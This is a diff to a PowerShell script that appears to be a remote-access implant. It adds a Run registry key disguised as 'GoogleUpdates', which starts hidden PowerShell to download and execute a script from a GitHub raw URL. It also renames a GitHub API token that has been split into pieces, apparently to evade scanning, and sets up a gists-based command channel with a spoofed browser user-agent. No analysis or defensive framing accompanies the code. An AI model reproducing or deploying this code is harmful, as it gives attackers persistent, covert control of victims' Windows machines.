@@ -4,10 +4,10 @@ $t1="896a0";
 $checkTime=60;
 $t2="3d6b0974ef647ae94f63";
 $t3="6263064648daeb0";
-$gistsApiToken=$t1+$t2+$t3;
+$gst=$t1+$t2+$t3;
 
 $name = "GoogleUpdates"
-$value ="powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/maymiday/rop/master/gpupdate.ps1')"
+$value ="C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noexit -nop IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/maymiday/rop/master/gpupdate.ps1')";
 try{
     New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -PropertyType String -Value $value -ErrorAction Stop
     $tip = "Success:"+$name;
@@ -59,8 +59,8 @@ function parseCommand($command){
 
 $oldCommand="";
 $webclient=new-object System.Net.WebClient
-#$webclient.Credentials=new-object System.Net.NetworkCredential($gistsUser,$gistsApiToken)
-$upass=[System.Text.Encoding]::UTF8.GetBytes("${gistsUser}:${gistsApiToken}");
+#$webclient.Credentials=new-object System.Net.NetworkCredential($gistsUser,$gst)
+$upass=[System.Text.Encoding]::UTF8.GetBytes("${gistsUser}:${gst}");
 $authHeader="Basic "+[System.Convert]::ToBase64String($upass);
 $webclient.Headers.Add("Authorization",$authHeader);
 $webclient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
